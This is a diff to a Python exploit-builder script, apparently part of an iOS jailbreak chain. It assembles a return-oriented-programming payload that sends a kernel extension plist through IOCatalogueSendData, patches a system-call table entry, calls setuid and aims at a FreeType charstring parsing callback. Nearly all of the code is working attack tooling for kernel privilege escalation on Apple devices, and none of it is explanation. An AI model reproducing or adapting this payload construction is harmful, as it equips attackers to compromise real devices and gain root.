@@ -3,6 +3,7 @@ import sys, base64, shlex, zlib
 import dmini
 from world1 import *
 import goo
+import cPickle as pickle
 
 if len(sys.argv) != 4:
     print >> sys.stderr, "usage: python catalog.py '-c cache' '-k kern' patchfile"
@@ -33,6 +34,13 @@ proc_ucred = dmini.cur.sym('_proc_ucred')
 
 dmini.init(shlex.split(sys.argv[1]))
 
+def wrap(num):
+    if (num & 0xf0000000) == 0x30000000:
+        return reloc(3, num, alignment=0x1000)
+    else:
+        return num
+dmini.cur.wrap = wrap
+
 ldm, stub, num_before_r0, num_after_r0 = dmini.cur.find_ldms(0x14414114)
 #print hex(ldm), hex(stub), num_before_r0, num_after_r0
 
@@ -43,20 +51,21 @@ kernstuff += '\0' * ((-len(kernstuff) & 0xfff) + (stub & 0xfff))
 
 plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
 
-init('R8', 'R10', 'R11', 'R4', 'R5', 'R6', 'R7', 'PC')
+init('R4', 'R5', 'PC')
 
 # btw
 locutus_len = os.path.getsize('../../locutus/locutus')
 
-# r0 came from stub.py
-out_sp, out_spp = stackunkpair()
-store_r0_to(out_spp)
+set_r0_to(reloc(0xe, 0x558))
 #funcall('_abort', None)
 load_r0_r0()
 load_r0_r0()
 load_r0_r0()
 locutus, locutusp = stackunkpair()
 store_r0_to(locutusp)
+add_r0_by(reloc(0xc, 0))
+plistp, plistpp = stackunkpair()
+store_r0_to(plistpp)
 
 #funcall('_printf', ptr('starting shellcode\n', True))
 
@@ -91,7 +100,7 @@ plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
 
 #funcall('_abort')
 dmini.cur.choose_file('/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit')
-funcall('_IOCatalogueSendData', 0, 1, ptr(plist), len(plist))
+funcall('_IOCatalogueSendData', 0, 1, plistp, len(plist))
 dmini.cur.choose_file('/usr/lib/libSystem.B.dylib')
 dbg_result()
 
@@ -124,8 +133,6 @@ while True:
 weirdfile += struct.pack('III', sysent_patch, 4, sysent_patch_orig,)
 weirdfile += '\0\0\0\0'
 
-print len(weirdfile), hex(scratch)
-
 funcall('_memcpy', scratch, ptr(weirdfile), len(weirdfile))
 store_val_to(scratch, sysent_patch)
 funcall('_syscall', 0); dbg_result()
@@ -157,11 +164,19 @@ funcall('_setuid', None); dbg_result()
 
 #funcall('_printf', ptr('done with shellcode\n', True))
 
-fancy_set_sp_to(out_sp)
+set_r0_to(1337)
+fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 
-final = finalize(0x11000000)
+final, relocs = finalize(reloc(0xd, 0), relocs=True)
 
-#final = zlib.compress(final)
-#heapdump(None)
-open('catalog.txt', 'w').write(final)
+heapdump(None)
 
+# add sp, #400; pop {r4, r5, pc}
+parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
+dmini.cur.choose_file('/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
+actual_parse_callback = dmini.cur.private_sym('_t1_decoder_parse_charstrings').value
+
+print 'len:', len(final), '/ 4 =', len(final)/4
+print relocs
+
+open('catalog.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'relocs': relocs, 'plist': plist}))
